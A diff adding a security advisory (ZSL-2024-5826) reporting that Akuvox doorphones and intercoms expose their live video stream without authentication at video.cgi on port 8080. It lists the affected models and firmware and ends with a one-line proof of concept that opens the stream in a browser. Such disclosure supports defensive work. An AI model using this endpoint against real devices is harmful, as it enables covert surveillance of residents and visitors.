@@ -1,0 +1,48 @@
+
+Akuvox Smart Intercom/Doorphone Unauthenticated Stream Disclosure
+
+
+Vendor: The Akuvox Company
+Product web page: https://www.akuvox.com
+Affected version: Doorphone:
+                    S539
+                    S532
+                    X916
+                    X915
+                    X912
+                    R29
+                  Intercom:
+                    R20K-2
+                    R20A-2
+                    C313W-2
+                    NS-2
+                    NC-2
+                    NX-2
+                  Firmware: 912.30.1.137
+
+Summary: Vandal-resistant Door Phone for High-end Buildings. Offering
+top-of-the-line features, Akuvox X912 is targeted at high-end residential
+and commercial projects. With a compact size, it is perfect for buildings
+with limited installation space.
+
+Desc: The application suffers from an unauthenticated live stream disclosure
+when requesting video.cgi endpoint on port 8080.
+
+Tested on: lighttpd/1.4.30
+           EasyHttpServer
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2024-5826
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2024-5826.php
+
+
+25.02.2024
+
+--
+
+
+$ firefox http://192.168.1.2:8080/video.cgi
